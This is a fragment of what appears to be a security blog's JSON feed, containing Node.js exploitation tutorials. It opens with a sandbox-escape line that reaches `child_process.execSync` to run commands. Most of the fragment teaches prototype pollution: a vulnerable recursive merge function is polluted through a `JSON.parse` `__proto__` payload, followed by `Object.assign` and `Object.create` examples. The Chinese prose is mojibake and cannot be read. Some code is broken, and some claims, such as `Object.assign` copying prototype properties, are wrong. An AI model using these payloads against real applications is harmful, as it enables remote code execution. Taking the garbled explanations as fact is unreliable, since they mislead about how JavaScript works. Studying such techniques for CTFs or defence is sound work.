process&#x27;)());</span><br></pre></td></tr></table></figure>\n<p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿”å›çš„ process å¯¹è±¡æ¥ rce äº†</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">y1.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span><br></pre></td></tr></table></figure>\n<p>å‚è€ƒ:<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTE4NTkjdG9jLTk=\">1.</span></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/05/10/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/",
            "url": "https://hq185187.github.io/2023/05/10/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/",
            "title": "åŸå‹é“¾æ±¡æŸ“",
            "date_published": "2023-05-10T15:07:02.584Z",
            "content_html": "<h2 id=\"ä¸€ä»€ä¹ˆæ˜¯åŸå‹å¯¹è±¡\"><a class=\"markdownIt-Anchor\" href=\"#ä¸€ä»€ä¹ˆæ˜¯åŸå‹å¯¹è±¡\">#</a> ä¸€ã€‚ä»€ä¹ˆæ˜¯åŸå‹å¯¹è±¡</h2>\n<p>æˆ‘ä»¬çŸ¥é“åœ¨ JavaScript ä¸­ï¼Œä¸€ä¸ªå·²ç»å­˜åœ¨æ„é€ å™¨çš„å¯¹è±¡ä¸­æ˜¯ä¸èƒ½æ·»åŠ æ–°çš„å±æ€§çš„ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ prototype ç»§æ‰¿æ·»åŠ </p>\n<h3 id=\"egæ·»åŠ å±æ€§å’Œæ–¹æ³•\"><a class=\"markdownIt-Anchor\" href=\"#egæ·»åŠ å±æ€§å’Œæ–¹æ³•\">#</a> eg æ·»åŠ å±æ€§å’Œæ–¹æ³•</h3>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Person</span>(<span class=\"params\">first,last,age</span>)&#123;</span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">firstname</span>=first;</span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">lastname</span>=last;</span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">age</span>=age;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title class_\">Person</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">nationality</span>=<span class=\"string\">&#x27;Chinese&#x27;</span><span class=\"comment\">//æ·»åŠ ä¸€ä¸ªå›½ç±å±æ€§</span></span><br><span class=\"line\"><span class=\"title class_\">Person</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">name</span>=<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"variable language_\">this</span>.<span class=\"property\">firstname</span>+<span class=\"string\">&quot; &quot;</span>+<span class=\"variable language_\">this</span>.<span class=\"property\">lastname</span>;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"comment\">//æ·»åŠ ä¸€ä¸ªæ–¹æ³•åå­—ä¸ºname</span></span><br><span class=\"line\"><span class=\"comment\">//è°ƒç”¨æ¬¡æ–¹æ³•</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> myFather = <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&quot;John&quot;</span>, <span class=\"string\">&quot;Doe&quot;</span>, <span class=\"number\">50</span>);</span><br><span class=\"line\"><span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;demo&quot;</span>).<span class=\"property\">innerHTML</span> =</span><br><span class=\"line\"><span class=\"string\">&quot;æˆ‘çš„çˆ¶äº²æ˜¯ &quot;</span> + myFather.<span class=\"title function_\">name</span>();</span><br></pre></td></tr></table></figure>\n<h3 id=\"ä¸ºä»€ä¹ˆ\"><a class=\"markdownIt-Anchor\" href=\"#ä¸ºä»€ä¹ˆ\">#</a> ä¸ºä»€ä¹ˆï¼Ÿ</h3>\n<p>æ‰€æœ‰çš„ JavaScript å¯¹è±¡éƒ½ä¼šä»ä¸€ä¸ª prototype (åŸå‹å¯¹è±¡) ä¸­ç»§æ‰¿å±æ€§å’Œæ–¹æ³•.JavaScript å¯¹è±¡æœ‰ä¸€ä¸ªæŒ‡å‘ä¸€ä¸ªåŸå‹å¯¹è±¡çš„é“¾ï¼Œå½“è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶ï¼Œä¸ä»…åœ¨è¯¥å¯¹è±¡ä¸Šæœå¯»ï¼Œè¿˜ä¼šæœå¯»è¯¥å¯¹è±¡çš„åŸå‹ï¼Œä»¥åŠè¯¥å¯¹è±¡åŸå‹çš„åŸå‹ï¼Œç›´åˆ°æ‰¾åˆ°å±æ€§æˆ–è€…æœ«å°¾.</p>\n<h2 id=\"äºŒprotoå’Œprototypeç”¨æ³•\"><a class=\"markdownIt-Anchor\" href=\"#äºŒprotoå’Œprototypeç”¨æ³•\">#</a> äºŒ.proto å’Œ prototype ç”¨æ³•</h2>\n<p>å¯¹è±¡.proto = æ„é€ å™¨ (æ„é€ å‡½æ•°).prototype<br>\neg</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Foo</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">bar</span>=<span class=\"number\">1</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title class_\">Foo</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">show</span>=<span class=\"keyword\">function</span> <span class=\"title function_\">show</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">bar</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> foo=<span class=\"keyword\">new</span> <span class=\"title class_\">Foo</span>()</span><br><span class=\"line\">foo.<span class=\"title function_\">show</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">foo.<span class=\"property\">__proto__</span>==<span class=\"title class_\">Foo</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span></span><br></pre></td></tr></table></figure>\n<p>åŸå‹é“¾æ˜¯ä»€ä¹ˆï¼Ÿ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__proto__æ˜¯ä»»ä½•å¯¹è±¡éƒ½æœ‰çš„å±æ€§,è€Œjsé‡Œä¸‡ç‰©çš†å¯¹è±¡,æ‰€ä»¥ä¼šå½¢æˆä¸€æ¡__proto__è¿èµ·æ¥çš„é“¾å­,é€’å½’è®¿é—®__proto__æœ€ç»ˆåˆ°å¤´,å¹¶ä¸”å€¼æ˜¯null</span><br><span class=\"line\">æ€»ç»“:</span><br></pre></td></tr></table></figure>\n<p>æ€»ç»“:<br>\nprototype æ˜¯ä¸€ä¸ªç±»çš„å±æ€§ï¼Œæ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰ prototype ä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼Œä¸€ä¸ªå¯¹è±¡ (foo) çš„ <code>__proto__</code> å±æ€§ï¼ŒæŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨çš„ç±» (Foo) çš„ prototype å±æ€§<br>\n eg</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Father</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">firstname</span>=<span class=\"string\">&#x27;Donald&#x27;</span></span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">lastname</span>=<span class=\"string\">&#x27;Trump&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Son</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">firstname</span>=<span class=\"string\">&#x27;Melania&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title class_\">Son</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Father</span>()</span><br><span class=\"line\"><span class=\"keyword\">let</span> son=<span class=\"keyword\">new</span> <span class=\"title class_\">Son</span>()</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"title class_\">Name</span>:$&#123;son.<span class=\"property\">firstname</span>&#125; $&#123;son.<span class=\"property\">lastname</span>&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//æŸ¥çœ‹åŸå‹å¯¹è±¡çš„æ„é€ å™¨</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"title class_\">Father</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">constructor</span>===<span class=\"title class_\">Father</span>)<span class=\"comment\">//true</span></span><br></pre></td></tr></table></figure>\n<p>è¾“å‡ºï¼šMelania Trump<br>\n è°ƒç”¨ son çš„ lastname æ—¶ï¼Œå…ˆåœ¨ Son æ‰¾ lastname å‘ç°æ²¡æœ‰å°±å»æ‰¾ son.<strong>proto</strong>, æŒ‡å‘ Son.prototype, æˆåŠŸç»§æ‰¿çˆ¶ç±»çš„ lastname</p>\n<h2 id=\"ä¸‰åŸå‹é“¾æ±¡æŸ“åŸç†\"><a class=\"markdownIt-Anchor\" href=\"#ä¸‰åŸå‹é“¾æ±¡æŸ“åŸç†\">#</a> ä¸‰ã€‚åŸå‹é“¾æ±¡æŸ“åŸç†</h2>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> baseObj = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  <span class=\"attr\">getName</span>: <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  <span class=\"keyword\">return</span> <span class=\"string\">&#x27;I am a base object&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â <span class=\"keyword\">const</span> maliciousObj = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â <span class=\"attr\">getName</span>: <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â <span class=\"keyword\">return</span> <span class=\"string\">&#x27;I am a malicious object&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â maliciousObj.<span class=\"property\">__proto__</span> = baseObj; <span class=\"comment\">// ä¿®æ”¹åŸå‹å¯¹è±¡ä¸º baseObj</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â <span class=\"keyword\">const</span> normalObj = &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â <span class=\"comment\">//console.log(normalObj.getName()); // è¾“å‡ºï¼šUncaught TypeError: normalObj.getName is not a function</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â <span class=\"comment\">// ä¿®æ”¹ normalObj å¯¹è±¡çš„åŸå‹ä¸º maliciousObj</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â <span class=\"title class_\">Object</span>.<span class=\"title function_\">setPrototypeOf</span>(normalObj, maliciousObj);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â <span class=\"comment\">// æ­¤æ—¶å†æ¬¡è®¿é—® getName æ–¹æ³•ï¼Œè¾“å‡ºè¢«æ±¡æŸ“çš„å†…å®¹</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(normalObj.<span class=\"title function_\">getName</span>()); <span class=\"comment\">// è¾“å‡ºï¼šI am a malicious object</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â <span class=\"comment\">//æ³¨æ„:</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â <span class=\"comment\">//è‹¥å°†maliciousObjçš„getNameç»™æ³¨é‡Šæ‰,åˆ™ä¼šè¿”å›I am a base object</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"å››å­˜åœ¨åŸå‹é“¾æ±¡æŸ“çš„å‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#å››å­˜åœ¨åŸå‹é“¾æ±¡æŸ“çš„å‡½æ•°\">#</a> å››ã€‚å­˜åœ¨åŸå‹é“¾æ±¡æŸ“çš„å‡½æ•°</h2>\n<h3 id=\"1mergeå‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#1mergeå‡½æ•°\">#</a> 1.merge å‡½æ•°</h3>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Â  <span class=\"keyword\">function</span> <span class=\"title function_\">merge</span>(<span class=\"params\">target, source</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> key <span class=\"keyword\">in</span> source) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> (key <span class=\"keyword\">in</span> source &amp;&amp; key <span class=\"keyword\">in</span> target) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  <span class=\"title function_\">merge</span>(target[key], source[key])</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  Â  Â  target[key] = source[key]</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> o1 = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> o2 = &#123;<span class=\"string\">&quot;a&quot;</span>: <span class=\"number\">1</span>, <span class=\"string\">&quot;__proto__&quot;</span>: &#123;<span class=\"string\">&quot;b&quot;</span>: <span class=\"number\">2</span>&#125;&#125;</span><br><span class=\"line\"><span class=\"comment\">//let o2=JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)</span></span><br><span class=\"line\"><span class=\"title function_\">merge</span>(o1, o2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(o1.<span class=\"property\">a</span>, o1.<span class=\"property\">b</span>)<span class=\"comment\">//1,2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//console.log(o1)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(o2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(o2.<span class=\"property\">__proto__</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//var o3=Object.create(o1)</span></span><br><span class=\"line\"></span><br><span class=\"line\">o3 = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(o3.<span class=\"property\">b</span>)<span class=\"comment\">//undefined</span></span><br></pre></td></tr></table></figure>\n<p>æ­¤æ—¶ c æ²¡æœ‰è¢«æ±¡æŸ“ï¼Œå› ä¸º o2 çš„ proto è¢«è§£æäº†ï¼Œé€šè¿‡ console.log (o2) å¯ä»¥çœ‹å‡ºåªæœ‰ä¸€ä¸ª a å±æ€§ï¼Œå› ä¸º o2 çš„ proto æ‰§è¡Œçš„å†…å®¹ä¸æ˜¯ o2 çš„åŸå‹çš„ prototype è€Œæ˜¯ {â€œbâ€:2} è¿™ä¸ªå¯¹è±¡ï¼Œæ²¡æœ‰åˆ°è¾¾æœ€ä¸Šå±‚çš„ Object.prototype<br>\n æ­¤æ—¶æˆ‘ä»¬åˆ©ç”¨ JSON.parse å‡½æ•°å°† o2 å˜æˆå¯¹è±¡å³å¯ï¼Œæ­¤æ—¶ o2 å°±æœ‰__proto__äº† (å³__proto__è¢«ä¼ é€’ç»™ o1), è€Œ o1 æ˜¯ Object çš„å®ä¾‹ (å°±æ˜¯ <code>o1.__proto__=Object.prototype</code> ), <code>o1.__proto__.b=2=o2.__proto__.b</code> , ç›¸å½“äºç»™ Object åŠ äº†ä¸€ä¸ªå±æ€§ b å€¼ä¸º 2, æ­¤æ—¶ c å°±è¢«æ±¡æŸ“äº†.</p>\n<h3 id=\"2cloneå‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#2cloneå‡½æ•°\">#</a> 2.clone å‡½æ•°</h3>\n<p>åœ¨ JavaScript ä¸­ï¼Œæœ‰æ—¶éœ€è¦éœ€è¦å°†ä¸€ä¸ªå¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•å¤åˆ¶åˆ°å¦ä¸€ä¸ªå¯¹è±¡ï¼Œå¯ä»¥ç”¨ clone æ–¹æ³•</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">cloneObject</span>(<span class=\"params\">source</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"title class_\">Object</span>.<span class=\"title function_\">assign</span>(&#123;&#125;, source);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ä½†æ˜¯ Object.assign () å‡½æ•°å­˜åœ¨åŸå‹é“¾æ±¡æŸ“çš„é£é™©ï¼Œå› ä¸ºå®ƒä¼šå¤åˆ¶æºå¯¹è±¡çš„åŸå‹å¯¹è±¡ä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼Œæ¯”å¦‚</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">cloneObject</span>(<span class=\"params\">source</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">return</span> <span class=\"title class_\">Object</span>.<span class=\"title function_\">assign</span>(&#123;&#125;, source);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// å®šä¹‰ä¸€ä¸ªåŸå‹å¯¹è±¡</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> myPrototype = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"attr\">sayHello</span>: <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;Hello!&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  <span class=\"comment\">// åˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  <span class=\"keyword\">var</span> myObject = &#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  myObject=<span class=\"title function_\">cloneObject</span>(myPrototype);</span><br><span class=\"line\"></span><br><span class=\"line\">Â  <span class=\"comment\">//console.log(myObject)</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  <span class=\"comment\">// è°ƒç”¨myObjectä¸Šçš„sayHelloæ–¹æ³•</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  myObject.<span class=\"title function_\">sayHello</span>(); <span class=\"comment\">// Hello!</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"3objectassignå‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#3objectassignå‡½æ•°\">#</a> 3.Object.assign å‡½æ•°</h3>\n<p>å¦‚æœæºå¯¹è±¡çš„å±æ€§æ˜¯ä¸€ä¸ªå¼•ç”¨ç±»å‹ï¼ˆå¦‚å¯¹è±¡ã€æ•°ç»„ç­‰ï¼‰ï¼Œåˆ™ä¼šå°†å¼•ç”¨å¤åˆ¶åˆ°ç›®æ ‡å¯¹è±¡ä¸­ï¼Œè¿™å¯èƒ½ä¼šé€ æˆåŸå‹é“¾æ±¡æŸ“çš„é£é™©ã€‚</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> globalA=&#123;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//åœ¨globalAçš„åŸå‹(Object)ä¸Šå®šä¹‰ä¸€ä¸ªå±æ€§</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Object</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">globala</span>=<span class=\"string\">&#x27;a&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//ç”¨Object.assignåˆå¹¶</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Object</span>.<span class=\"title function_\">assign</span>(globalA,&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"attr\">test</span>:<span class=\"string\">&#x27;testtest&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">globalA.<span class=\"property\">globala</span>=<span class=\"string\">&#x27;aa&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(globalA.<span class=\"property\">test</span>);<span class=\"comment\">//testtest</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(globalA.<span class=\"property\">globala</span>);<span class=\"comment\">//aa</span></span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj=<span class=\"title class_\">Object</span>.<span class=\"title function_\">create</span>(globalA);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(obj.<span class=\"property\">test</span>);</span><br></pre></td></tr></table></figure>\n<h3 id=\"4objectcreateå‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#4objectcreateå‡½æ•°\">#</a> 4.Object.create å‡½æ•°</h3>\n<p><code>Object.create</code>  æ˜¯ä¸€ä¸ªç”¨äºåˆ›å»ºæ–°å¯¹è±¡çš„å‡½æ•°ï¼Œå®ƒå¯ä»¥ä½¿ç”¨ç°æœ‰å¯¹è±¡ä½œä¸ºæ–°å¯¹è±¡çš„åŸå‹ã€‚</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span 